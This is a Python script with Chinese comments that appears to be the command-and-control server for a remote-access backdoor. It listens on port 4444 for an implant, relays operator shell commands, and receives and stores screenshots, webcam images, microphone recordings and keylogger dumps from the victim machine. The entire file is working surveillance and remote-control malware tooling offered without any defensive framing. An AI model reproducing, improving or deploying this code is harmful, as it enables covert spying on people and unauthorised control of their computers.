#!/usr/bin/env python3
import socket
import sys

HOST = "0.0.0.0"
PORT = 4444



def recv_blob(sock, chunk=4096):
    """
    收一段回覆（可能是文字、可能是二進位檔）。
    用簡單的「對方暫停傳送」做邊收邊停，搭配 backdoor 的 _OK_/ _ERR_ 前綴。
    """
    data = b""
    sock.settimeout(5.0)
    while True:
        try:
            part = sock.recv(chunk)
        except socket.timeout:
            break
        if not part:
            break
        data += part

        if len(part) < chunk:
            break
    return data

def is_ok(data: bytes) -> bool:
    return data.startswith(b"_OK_")

def is_err(data: bytes) -> bool:
    return data.startswith(b"_ERR_")

def strip_prefix(data: bytes) -> bytes:

    if data.startswith(b"_OK_"):
        return data[4:]
    if data.startswith(b"_ERR_"):

        return data[5:]
    return data

def magic_ok(payload: bytes, kind: str) -> bool:
    """
    針對不同檔案類型做 magic bytes 檢查，避免把錯誤文字存成檔案。
      - screenshot: PNG
      - camera_snap: JPEG（也支援某些裝置抓成 PNG）
      - mic_record: WAV
      - keylog_dump: 純文字，不檢查
    """
    if kind == "screenshot":      # PNG
        return payload.startswith(b"\x89PNG\r\n\x1a\n")
    if kind == "camera_snap":     # JPEG 或 PNG
        return payload.startswith(b"\xff\xd8") or payload.startswith(b"\x89PNG\r\n\x1a\n")
    if kind == "mic_record":      # WAV (RIFF....WAVE)
        return payload.startswith(b"RIFF") and (b"WAVE" in payload[:16])
    if kind == "keylog_dump":     # text
        return True
    return True

def save_blob_or_print_error(raw: bytes, filename: str, kind: str):
    """
    若為 _ERR_：印出錯誤，不存檔。
    若為 _OK_：做 magic 檢查，通過才存檔；不通過就警告並不存。
    其他（沒有前綴）視為純文字輸出。
    """
    if is_err(raw):
        msg = strip_prefix(raw).decode(errors="ignore")
        print(f"[-] {kind} error: {msg}")
        return

    if is_ok(raw):
        payload = strip_prefix(raw)
        if not payload:
            print(f"[-] {kind} error: empty payload, not saving.")
            return
        if not magic_ok(payload, kind):

            print(f"[-] {kind} error: payload does not look like a valid {kind} file; not saving.")

            return
        with open(filename, "wb") as f:
            f.write(payload)
        print(f"[+] {kind} saved as {filename}")
        return

    print(raw.decode(errors="ignore"))


def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        server.bind((HOST, PORT))
    except OSError as e:
        print(f"[!] Bind failed: {e}. 可能是埠 {PORT} 被占用，先關掉舊的 c2_server 或改用其他埠。")
        sys.exit(1)

    server.listen(1)
    print(f"[+] Listening on {HOST}:{PORT}")

    client, addr = server.accept()
    print(f"[+] Connection from {addr[0]}")

    try:
        while True:
            cmd = input("C2> ").strip()
            if not cmd:
                continue

            client.sendall(cmd.encode())

            if cmd in ("screenshot", "camera_snap", "mic_record", "keylog_dump"):
                data = recv_blob(client)

                if cmd == "screenshot":
                    save_blob_or_print_error(data, "screenshot.png", "screenshot")
                elif cmd == "camera_snap":
                    save_blob_or_print_error(data, "webcam.jpg", "camera_snap")
                elif cmd == "mic_record":
                    save_blob_or_print_error(data, "mic.wav", "mic_record")
                elif cmd == "keylog_dump":
                    save_blob_or_print_error(data, "keylog.txt", "keylog_dump")

            else:
                out = recv_blob(client)               
                if is_err(out):
                    print("[-] Error:", strip_prefix(out).decode(errors="ignore"))
                else:
                    print(out.decode(errors="ignore"))
    except (KeyboardInterrupt, EOFError):
        print("\n[+] Bye.")
    finally:
        try:
            client.close()
        except Exception:
            pass
        server.close()

if __name__ == "__main__":
    main()
